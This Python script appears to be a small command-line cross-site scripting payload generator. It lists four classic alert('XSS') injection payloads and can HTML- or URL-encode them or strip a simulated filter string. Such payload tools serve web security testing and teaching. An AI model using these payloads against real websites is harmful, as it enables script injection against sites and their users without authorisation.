import argparse
import logging
import sys
import html
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="XSS Payload Generator")
    parser.add_argument("-p", "--payload", help="Base payload to encode or filter.", required=False)
    parser.add_argument("-e", "--encoding", choices=['html', 'url', 'none'], default='none', help="Encoding type: html, url, none. Default: none")
    parser.add_argument("-f", "--filter", help="Filter to simulate (e.g., remove <script>).  Provide filter string.", required=False)
    parser.add_argument("-l", "--list", action="store_true", help="List available payloads.") # option to list payloads
    parser.add_argument("-o", "--output", help="Output file to write payloads to.", required=False) # option to output file
    return parser

def encode_payload(payload, encoding_type):
    """
    Encodes the payload based on the specified encoding type.

    Args:
        payload (str): The payload to encode.
        encoding_type (str): The type of encoding to use ('html', 'url', 'none').

    Returns:
        str: The encoded payload.
    """
    try:
        if encoding_type == 'html':
            return html.escape(payload)
        elif encoding_type == 'url':
            return urllib.parse.quote(payload)
        elif encoding_type == 'none':
            return payload
        else:
            logging.error(f"Invalid encoding type: {encoding_type}")
            return None
    except Exception as e:
        logging.error(f"Error encoding payload: {e}")
        return None

def filter_payload(payload, filter_string):
    """
    Filters the payload by removing the specified filter string.

    Args:
        payload (str): The payload to filter.
        filter_string (str): The string to remove from the payload.

    Returns:
        str: The filtered payload.
    """
    try:
        if not filter_string:
            return payload

        return payload.replace(filter_string, "")
    except Exception as e:
        logging.error(f"Error filtering payload: {e}")
        return None

def list_payloads():
    """Lists some common XSS payloads."""
    print("[+] Common XSS Payloads:")
    print("[+] <script>alert('XSS')</script>")
    print("[+] <img src=x onerror=alert('XSS')>")
    print("[+] <a href=\"javascript:alert('XSS')\">Click Me</a>")
    print("[+] <body onload=alert('XSS')>")

def write_to_file(filename, payload):
    """Writes the payload to a file.

    Args:
        filename (str): The name of the file to write to.
        payload (str): The payload to write.
    """
    try:
        with open(filename, "w") as f:
            f.write(payload)
        logging.info(f"Payload written to {filename}")
    except Exception as e:
        logging.error(f"Error writing to file: {e}")


def main():
    """
    Main function to parse arguments, encode/filter payloads, and print the result.
    """
    parser = setup_argparse()
    args = parser.parse_args()

    if args.list:
      list_payloads()
      sys.exit(0)

    if not args.payload:
        logging.error("Payload is required if not listing payloads. Use -p <payload>")
        sys.exit(1)

    payload = args.payload

    # Input validation - basic check for payload length
    if len(payload) > 2048:
        logging.warning("Payload length exceeds recommended limit (2048 characters).")

    # Encode the payload
    encoded_payload = encode_payload(payload, args.encoding)
    if encoded_payload is None:
        sys.exit(1)

    # Filter the payload
    filtered_payload = filter_payload(encoded_payload, args.filter)
    if filtered_payload is None:
        sys.exit(1)

    if args.output:
        write_to_file(args.output, filtered_payload)
    else:
        print(filtered_payload)

if __name__ == "__main__":
    main()

# Usage Examples:
# python vuln-XSS-Payload-Generator.py -p "<script>alert('XSS')</script>"
# python vuln-XSS-Payload-Generator.py -p "<script>alert('XSS')</script>" -e html
# python vuln-XSS-Payload-Generator.py -p "<script>alert('XSS')</script>" -e url
# python vuln-XSS-Payload-Generator.py -p "<script>alert('XSS')</script>" -f "<script>"
# python vuln-XSS-Payload-Generator.py -p "<script>alert('XSS')</script>" -e html -f "<script>"
# python vuln-XSS-Payload-Generator.py -l
# python vuln-XSS-Payload-Generator.py -p "<script>alert('XSS')</script>" -o output.txt